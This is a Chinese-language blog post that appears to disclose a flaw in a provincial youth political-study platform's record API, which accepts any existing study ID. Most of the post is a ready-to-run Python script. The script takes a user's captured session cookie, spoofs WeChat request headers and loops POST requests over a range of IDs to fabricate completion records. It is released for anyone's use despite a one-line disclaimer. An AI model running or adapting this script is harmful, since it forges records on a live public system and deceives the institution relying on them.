---
title: 汉东省“青年大学习”学习记录统计API漏洞
date: 2020-10-29
tags:  漏洞 bug 后端 入狱警告 法律的边缘
categories: article
---

### Summary

汉东省“青年大学习”学习记录API(http://api.xxx.cn/WANGLUOAPI/XUEXI/TIANJIAXUEXIJILU)存在不验证“仅限本期学习”问题，导致该API允许接收任何已存在的学习ID(XUEXIID)。API使用Cookies(You-Know-It-1)验证用户身份并接收POST请求统计学习记录。

直接POST对应的学习ID即可统计成功。值得注意的是，系统显示的学习记录时间为POST时间，明显未通过正常渠道获得。

### 漏洞利用代码示例

```python
# Fuck-Handong-QNDXX
# Author:You-Know-Who
# Fixed by Sunset
# Python 3
# Open Source with Do What The Fuck You Want To Public License
import requests
import time

print("请尽量确保手机和此设备处于同一网络环境下并使用Fiddler抓包获得的信息")
myua = input("请输入你的UserAgent：")
mycookies = input("请输入你的Cookies：You-Know-It-1=")


headers = {'user-agent': str(myua), 'cookie': 'You-Know-It-1='+str(mycookies), 'origin': 'http://front.xxx.cn', 'referer': 'http://front.xxx.cn/XUEXI',
           "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "com.tencent.mm", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}

# API URL
url = 'http://api.xxx.cn/WANGLUOAPI/XUEXI/TIANJIAXUEXIJILU'

fromwhere = input("请输入开始ID：")
towhere = input("请输入截止ID：")

for id in range(int(fromwhere), int(towhere)+1):
    postreq = "Init"
    data = {'XUEXIID': str(id), 'LINGPAI': ''}
    print("----------")
    print(id)
    print("POST:"+str(data))
    postreq = requests.post(url, headers=headers, data=data)
    print(str(postreq))
    print(str(postreq.text))
    print("----------")
    time.sleep(1)

print("完成")
```

### 免责声明

此漏洞公开报告仅供技术交流，任何人的不恰当操作与作者无关。
